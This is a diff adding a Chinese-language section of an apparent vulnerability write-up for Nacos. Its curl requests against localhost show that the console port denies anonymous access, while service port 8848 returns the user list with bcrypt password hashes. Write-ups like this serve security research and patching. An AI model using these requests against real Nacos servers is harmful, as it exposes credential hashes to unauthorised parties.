@@ -1,0 +1,17 @@
+### 步骤 1：攻击前基线 —— 控制台侧鉴权正常，OPEN_API 侧失守
+
+# 1-1 控制台端口 8080：匿名读用户列表 -> 被拒
+$ curl -s -i "http://127.0.0.1:8080/v3/auth/user/list?pageNo=1&pageSize=10" | head -1
+HTTP/1.1 403 
+{"code":10001,"message":"access denied","data":"Code: 401, Message: User not found! Please check user exist or password is right!."}
+
+# 1-2 控制台端口 8080：匿名读生产配置 -> 被拒
+$ curl -s "http://127.0.0.1:8080/v3/console/cs/config?dataId=payment-service.yaml&groupName=PROD"
+{"code":10001,"message":"access denied","data":"Code: 401, Message: User not found! Please check user exist or password is right!."}
+
+# 1-3 服务端口 8848（OPEN_API 桶）：同一个接口，匿名直接放行
+$ curl -s -i "http://127.0.0.1:8848/nacos/v3/auth/user/list?pageNo=1&pageSize=10" | head -1
+HTTP/1.1 200 
+{"code":0,"message":"success","data":{"totalCount":1,"pageNumber":1,"pagesAvailable":1,"pageItems":[{"username":"nacos","password":"$2a$10$GyFT7dmG5INf7hUlhChNAu4cvgeDp92VrDuHHRSCeiYrXu3SZYKP6"}]}}
+
+# 同一路径 /v3/auth/user/list，8080 返回 403，8848 返回 200 + 全部用户的 bcrypt 口令哈希
